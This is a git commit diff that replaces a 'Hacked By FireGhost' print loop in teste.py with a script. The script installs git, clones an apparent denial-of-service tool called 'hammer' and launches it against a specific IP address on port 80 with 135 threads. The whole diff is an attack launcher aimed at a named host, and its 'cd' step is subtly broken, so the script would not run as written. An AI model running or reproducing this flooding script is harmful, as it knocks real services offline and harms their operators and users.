747881595e21d91063ba6fb4c2c12a9fe4e4c11b
FireGhost158 <61974913+FireGhost158@users.noreply.github.com>
2020-03-14 14:54:58 -0300

    Update teste.py

--- teste.py
+++ teste.py
@@ -1,2 +1,9 @@
-while True:
-    print('Hacked By FireGhost')
+import os
+
+os.system('apt install git')
+os.system('clear')
+os.system('git clone https://github.com/cyweb/hammer')
+os.system('clear')
+os.system('cd hammer')
+os.system('apt install python3')
+os.system('python3 hammer.py -s 191.232.51.82 -p 80 -t 135')
